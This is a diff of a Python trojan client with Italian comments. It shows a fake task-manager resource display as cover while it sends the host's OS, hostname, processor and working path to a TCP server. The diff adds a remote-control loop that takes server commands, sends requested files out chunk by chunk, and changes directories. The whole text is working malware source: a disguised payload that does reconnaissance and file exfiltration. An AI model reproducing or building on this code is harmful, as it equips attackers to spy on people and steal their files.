@@ -7,30 +7,45 @@ import cpuinfo
 import signal
 
 IP="localhost"
-PORT = 9090 #Porta di Ascolto del TCP
+PORT = 11000 #Porta di Ascolto del TCP
 ADDR = (IP, PORT)
 SIZE = 4096
 FORMAT = "utf-8"
 FORMATWIN="windows-1252"
 FORMATPDF="latin-1"
 
+#funzione di pulizia schermo per unix e windows
+def clearScreen():
+    #for windows
+    if name == 'nt':
+        _ = system('cls')
+    #for mac and linux(here, os.name is 'posix')
+    else:
+        _ = system('clear')
+
+
 #comportamento da trojan
 def trojanBehaviour():
 
     while True:
-        cpu=psutil.cpu_percent()
-        ram=psutil.virtual_memory().percent
-        disk=psutil.disk_usage("/").percent
-        processes_count=0
-        print("\n\b\b\bRESOURCE MANAGEMENT SYSTEM\n")
-        print("              --     Task manager: Current state of usage      --\n\n")
-        #facciamo un display a video dell'utilizzo
-        print("              --------------------------------------------------------- ")
-        print("             | CPU USAGE | RAM USAGE | DISK USAGE | RUNNING PROCESSES |")
-        print("             | {:02}%       | {:02}%       | {:02}%        | {:03}               |".format(int(cpu),int(ram),int(disk),processes_count))
-        print("              --------------------------------------------------------- ")
-        time.sleep(1)
-        clearScreen()
+        try:
+            cpu=psutil.cpu_percent()
+            ram=psutil.virtual_memory().percent
+            disk=psutil.disk_usage("/").percent
+            processes_count=0
+            print("\n\b\b\bRESOURCE MANAGEMENT SYSTEM\n")
+            print("              --     Task manager: Current state of usage      --\n\n")
+            #facciamo un display a video dell'utilizzo
+            print("              --------------------------------------------------------- ")
+            print("             | CPU USAGE | RAM USAGE | DISK USAGE | RUNNING PROCESSES |")
+            print("             | {:02}%       | {:02}%       | {:02}%        | {:03}               |".format(int(cpu),int(ram),int(disk),processes_count))
+            print("              --------------------------------------------------------- ")
+            time.sleep(1)
+            clearScreen()
+        except:
+            print("              --------------------------------------------------------- ")
+            print("             | CPU USAGE | RAM USAGE | DISK USAGE | RUNNING PROCESSES |")
+            print("              --------------------------------------------------------- ")
 
 
 #gestisce il ctrl-C per l'uscita
@@ -39,13 +54,15 @@ def signalHandler(signum,frame):
     print(":",msg,end="",flush=True)
     exit(1)
 
+
+#manda le informazioni base
 def sendInfo(client):
     # Info piattaforma
     mando = 1
     # Mando le informazioni raccolte al Server
     while mando == 1:
         try:
-            infos = "OS: " + platform.system() + "\nMachine: " + platform.machine() + "\nHost: " + platform.node() + "\nProcessor: " + platform.processor() + "\nPlatform: " + platform.platform() + "\nRelease: " + platform.release()
+            infos = "Operating System: " + platform.system() + "\nMachine: " + platform.machine() + "\nHost: " + platform.node() + "\nProcessor: " + platform.processor() + "\nPlatform: " + platform.platform() + "\nRelease: " + platform.release()+ "\nPath: " + os.getcwd()
             client.send((str((len(infos)))).encode(FORMAT))
             client.send(((infos)).encode(FORMAT))
             mando = 0
@@ -70,6 +87,31 @@ def clientConnection():
         clientConnection()
 
 
+def openRemoteControl(client):
+
+    while True:
+        client.send((os.getcwd()).encode(FORMAT))
+        comando = client.recv(1024).decode(FORMAT)
+
+        if comando[0:8] == "download":
+            #download "ciao.txt"
+            filename=comando[10:]
+            filesize=os.path.getsize(filename)
+            numeroByteLetti=0
+
+            with open(filename, 'rb') as f:
+                line = f.read(1024)
+                # Keep sending data to the client
+                while (line):
+                    client.send(line)
+                    line = f.read(1024)
+
+                f.close()
+                break
+
+        elif comando[0:5] == "cd ..":
+            os.chdir("..")
+
 def main():
 
         signal.signal(signal.SIGINT,signalHandler)
@@ -77,9 +119,9 @@ def main():
         print("Invio informazioni sul mio sistema al server")
 
         sendInfo(client)
+        openRemoteControl(client)
         client.close()
 
-        #remote control
 
 
     #start trojan
